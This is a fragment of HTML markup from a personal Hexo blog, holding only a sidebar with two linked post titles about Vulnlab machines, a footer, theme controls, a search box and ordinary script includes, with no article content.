src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Fdf7a8010-c06f-4ab7-b4ca-840c76b90893%2FUntitled.png?table=block&amp;id=4eee05c7-64ed-409d-9fab-63f5a6e430ba&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1020&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Job - Vulnlab"/></a><div class="content"><a class="title" href="/2023/10/25/Job-Vulnlab/" title="Job - Vulnlab">Job - Vulnlab</a><time datetime="2023-10-25T12:19:27.000Z" title="Created 2023-10-25 12:19:27">2023-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/19/Media-Vulnlab/" title="Media - Vulnlab"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F723ecb50-3ce1-43a7-8202-b53f76aa2ccf%2Fmedia.png?table=block&amp;id=965e07b3-adbf-4f84-b843-97ecaafe658a&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1020&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Media - Vulnlab"/></a><div class="content"><a class="title" href="/2023/10/19/Media-Vulnlab/" title="Media - Vulnlab">Media - Vulnlab</a><time datetime="2023-10-19T18:08:57.000Z" title="Created 2023-10-19 18:08:57">2023-10-19</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By serioton</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I love cats (=^･ω･^=) !</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div></div></body></html>